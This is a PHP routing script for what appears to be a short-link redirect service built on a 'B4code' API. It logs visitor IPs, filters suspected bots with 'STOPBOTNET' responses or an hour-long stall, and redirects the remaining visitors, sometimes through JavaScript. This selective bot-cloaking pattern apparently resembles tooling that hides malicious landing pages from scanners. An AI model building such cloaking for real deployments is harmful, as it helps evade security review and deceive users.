<?php
error_reporting(0);
require_once "config.php";
require_once "lib/function/main.php";

$B4code = new B4code($Apikey);
$B4code->GetIP();
switch(true){
    case (preg_match("/^index$/", $_GET["q"])):
        $B4code->redirect(200);
        break;
    case (preg_match("/^rsc\/rjs\.json$/", $_GET['q'])):
        $B4code->PostResponseJS();
        break;
    case (isset($_GET["q"]) && preg_match("/^[a-z0-9A-Z]*$/", $_GET["q"])):
        $RedirectTo = json_decode($B4code->RedirectTo($_GET["q"]), true);
        switch(true){
            case isset($RedirectTo["redirectTo"]):
                switch($RedirectTo["redirectTo"]){
                    case "STOPBOTNET 403":
                        $B4code->redirect('STOPBOTNET 403');
                        break;
                    case "STOPBOTNET 404":
                        $B4code->redirect('STOPBOTNET 404');
                        break;
                    case "SERVER NOT RESPOND":
                        ob_start();
                        sleep(3600);
                        ob_end_clean();
                        break;
                    default:
                        switch($RedirectTo["IPStatus"]["BlockAccess"]){
                            case 1:
                                $B4code->redirect($RedirectTo["redirectTo"]);
                                break;
                            default:
                                switch(true){
                                    case $RedirectTo["jsResponse"]:
                                        $B4code->RedirectWithJs($RedirectTo["redirectTo"]);
                                        break;
                                    default:
                                        $B4code->redirect($RedirectTo["redirectTo"]);
                                        break;
                                }
                                break;
                        }
                        break;
                }
                break;
            default:
                $B4code->redirect('STOPBOTNET 404');
                break;
        }
        break;
    case (isset($_GET["q"]) && !preg_match("/^[a-z0-9A-Z]*$/", $_GET["q"])):
        $B4code->redirect('STOPBOTNET 405');
        break;
    default:
        $B4code->redirect(200);
        break;
}